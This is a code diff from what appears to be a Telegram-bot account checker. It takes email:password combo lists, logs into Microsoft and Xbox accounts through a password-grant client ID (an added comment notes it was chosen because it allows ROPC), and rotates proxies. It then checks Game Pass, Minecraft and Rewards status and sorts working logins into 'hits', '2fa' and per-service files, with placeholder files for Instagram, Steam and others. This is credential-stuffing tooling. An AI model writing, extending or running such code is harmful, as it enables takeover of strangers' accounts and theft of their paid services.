@@ -38,6 +38,7 @@ MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
 GAMEPASS_URL = "https://collections.mp.microsoft.com/v9.0/collections/publisherQuery"
 REWARDS_URL = "https://prod.rewardsplatform.microsoft.com/dapi/me?channel=SAAndroid&options=511"
 
+# Switched back to the Minecraft Client ID which allows ROPC (password grant)
 CLIENT_ID = "00000000402B5328"
 SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
 
@@ -162,11 +163,10 @@ async def xbox_profile(session, xsts_token, uhs, xuid):
     return {}
 
 async def check_gamepass(session, xsts_token, uhs):
-    # Query the user's entitlements for Game Pass
     payload = {
         "market": "US",
         "language": "en-US",
-        "productSkuIds": ["9N0L65V3Z5T3"], # Example Game Pass Ultimate SKU
+        "productSkuIds": ["9N0L65V3Z5T3"],
         "expandSatisfyingItems": True
     }
     headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "Content-Type": "application/json", "Accept": "application/json"}
@@ -174,7 +174,6 @@ async def check_gamepass(session, xsts_token, uhs):
         async with session.post(GAMEPASS_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
-                # Parse the response to see if the user has an active subscription
                 items = data.get("satisfyingItems", [])
                 for item in items:
                     if item.get("isActive"): return True
@@ -271,7 +270,6 @@ async def process_combos(combos, chat_id, status_msg, bot):
     def write_file(name, lines):
         with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))
 
-    # Write all Microsoft services
     write_file("hits.txt", [f"{r['email']}:{r['password']}" for r in hits])
     write_file("bad.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in bad])
     write_file("2fa.txt", [f"{r['email']}:{r['password']}" for r in tfa])
@@ -283,7 +281,6 @@ async def process_combos(combos, chat_id, status_msg, bot):
     write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r['minecraft']])
     write_file("rewards.txt", [f"{r['email']}:{r['password']} | Points: {r['rewards']}" for r in hits if r['rewards'] > 0])
     
-    # Placeholders for third-party services
     placeholders = ["instagram.txt", "psn.txt", "steam.txt", "supercell.txt", "tiktok.txt", "balance.txt"]
     for ph in placeholders:
         with open(os.path.join(workdir, ph), "w") as f:
